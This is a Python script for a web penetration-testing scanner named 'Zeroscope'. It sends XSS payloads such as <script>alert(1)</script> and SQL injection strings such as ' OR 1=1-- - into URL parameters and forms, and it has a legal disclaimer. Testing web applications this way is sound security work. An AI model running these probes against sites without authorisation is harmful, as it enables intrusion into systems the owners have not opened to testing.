#!/usr/bin/env python3
import argparse
import requests
import time
from urllib.parse import urlparse, parse_qs, urljoin
from bs4 import BeautifulSoup
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

class Scanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Zeroscope/1.0'})

    def scan_xss(self, url, verbose=False, output_file=None):
        """Scan for XSS vulnerabilities"""
        print(f"\n{Fore.CYAN}[*] Starting XSS Scan{Style.RESET_ALL}")
        
        payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '" onmouseover=alert(1) x="',
            'javascript:alert(1)'
        ]
        
        # Test URL parameters
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if params:
            print(f"{Fore.BLUE}[*] Testing URL parameters{Style.RESET_ALL}")
            for param in params:
                for payload in payloads:
                    try:
                        test_params = params.copy()
                        test_params[param] = payload
                        test_url = parsed._replace(query=None).geturl()
                        query_str = "&".join(f"{k}={v[0]}" for k,v in test_params.items())
                        test_url += f"?{query_str}"
                        
                        if verbose:
                            print(f"Testing: {test_url}")
                            
                        response = self.session.get(test_url)
                        
                        if payload in response.text:
                            msg = f"{Fore.GREEN}[+] XSS found in parameter: {param}{Style.RESET_ALL}"
                            msg += f"\nPayload: {payload}\nURL: {test_url}\n"
                            print(msg)
                            
                            if output_file:
                                with open(output_file, 'a') as f:
                                    f.write(msg + "\n")
                                    
                    except Exception as e:
                        if verbose:
                            print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")

        # Test forms
        try:
            response = self.session.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            if forms:
                print(f"{Fore.BLUE}[*] Testing forms{Style.RESET_ALL}")
                for form in forms:
                    form_details = self._analyze_form(form, url)
                    for payload in payloads:
                        if self._test_form_xss(form_details, payload, verbose):
                            msg = f"{Fore.GREEN}[+] XSS found in form{Style.RESET_ALL}"
                            msg += f"\nAction: {form_details['action']}"
                            msg += f"\nMethod: {form_details['method']}"
                            msg += f"\nPayload: {payload}\n"
                            print(msg)
                            
                            if output_file:
                                with open(output_file, 'a') as f:
                                    f.write(msg + "\n")
                                    
        except Exception as e:
            if verbose:
                print(f"{Fore.RED}[!] Error scanning forms: {e}{Style.RESET_ALL}")

    def scan_sqli(self, url, verbose=False, output_file=None):
        """Scan for SQL injection vulnerabilities"""
        print(f"\n{Fore.CYAN}[*] Starting SQLi Scan{Style.RESET_ALL}")
        
        payloads = [
            "'",
            '"',
            "' OR '1'='1",
            '" OR "1"="1',
            "' OR 1=1-- -",
            "' UNION SELECT null,version(),3-- -"
        ]
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if params:
            for param in params:
                for payload in payloads:
                    try:
                        test_params = params.copy()
                        test_params[param] = payload
                        test_url = parsed._replace(query=None).geturl()
                        query_str = "&".join(f"{k}={v[0]}" for k,v in test_params.items())
                        test_url += f"?{query_str}"
                        
                        start_time = time.time()
                        response = self.session.get(test_url)
                        elapsed = time.time() - start_time
                        
                        # Error-based detection
                        error_indicators = [
                            'SQL syntax',
                            'MySQL',
                            'PostgreSQL',
                            'ORA-',
                            'unclosed quotation'
                        ]
                        
                        if any(indicator in response.text for indicator in error_indicators):
                            msg = f"{Fore.GREEN}[+] SQLi found in parameter: {param}{Style.RESET_ALL}"
                            msg += f"\nPayload: {payload}"
                            msg += f"\nURL: {test_url}\n"
                            print(msg)
                            
                            if output_file:
                                with open(output_file, 'a') as f:
                                    f.write(msg + "\n")
                                    
                    except Exception as e:
                        if verbose:
                            print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")

    def _analyze_form(self, form, base_url):
        """Extract form details"""
        details = {}
        details['action'] = urljoin(base_url, form.get('action', ''))
        details['method'] = form.get('method', 'get').lower()
        details['inputs'] = []
        
        for input_tag in form.find_all('input'):
            details['inputs'].append({
                'type': input_tag.get('type', 'text'),
                'name': input_tag.get('name'),
                'value': input_tag.get('value', '')
            })
            
        return details

    def _test_form_xss(self, form_details, payload, verbose=False):
        """Test a form for XSS"""
        data = {}
        for input_field in form_details['inputs']:
            if input_field['type'] in ('text', 'search', 'textarea'):
                data[input_field['name']] = payload
            else:
                data[input_field['name']] = input_field['value']
                
        try:
            if form_details['method'] == 'post':
                response = self.session.post(form_details['action'], data=data)
            else:
                response = self.session.get(form_details['action'], params=data)
                
            return payload in response.text
            
        except Exception as e:
            if verbose:
                print(f"{Fore.RED}[!] Form test error: {e}{Style.RESET_ALL}")
            return False

def show_banner():
    banner = f"""
    {Fore.RED}╦ ╦┌─┐┌─┐┌─┐┌─┐┌─┐┌─┐┌┬┐
    {Fore.RED}║║║├┤ ├─┘├─┘│ │└─┐ ├┤  │ 
    {Fore.RED}╚╩╝└─┘┴  ┴  └─┘└─┘└─┘ ┴ 
    {Fore.YELLOW}Web Application Penetration Testing Tool
    {Style.RESET_ALL}"""
    print(banner)

def show_disclaimer():
    disclaimer = f"""
    {Fore.RED}[!] LEGAL DISCLAIMER: 
    {Style.RESET_ALL}This tool is for educational and authorized testing purposes only. 
    Unauthorized use against systems you don't own or have permission to test is illegal.
    By using this tool, you agree to use it only for lawful purposes.
    """
    print(disclaimer)
    
    confirm = input(f"{Fore.YELLOW}[?] Do you agree to use this tool responsibly? (y/N): {Style.RESET_ALL}")
    if confirm.lower() != 'y':
        print(f"{Fore.RED}[!] Exiting...{Style.RESET_ALL}")
        exit()

def main():
    show_banner()
    show_disclaimer()
    
    parser = argparse.ArgumentParser(description='Zeroscope - Web Application Penetration Testing Tool')
    subparsers = parser.add_subparsers(dest='module', required=True, help='Select scan type')
    
    # XSS Parser
    xss_parser = subparsers.add_parser('xss', help='XSS Scanner')
    xss_parser.add_argument('-u', '--url', required=True, help='Target URL')
    xss_parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    xss_parser.add_argument('-o', '--output', help='Output file')
    
    # SQLi Parser
    sqli_parser = subparsers.add_parser('sqli', help='SQL Injection Scanner')
    sqli_parser.add_argument('-u', '--url', required=True, help='Target URL')
    sqli_parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    sqli_parser.add_argument('-o', '--output', help='Output file')
    
    args = parser.parse_args()
    scanner = Scanner()
    
    if args.module == 'xss':
        scanner.scan_xss(args.url, args.verbose, args.output)
    elif args.module == 'sqli':
        scanner.scan_sqli(args.url, args.verbose, args.output)
    
    print(f"\n{Fore.GREEN}[+] Scan completed!{Style.RESET_ALL}")

if __name__ == '__main__':
    main()
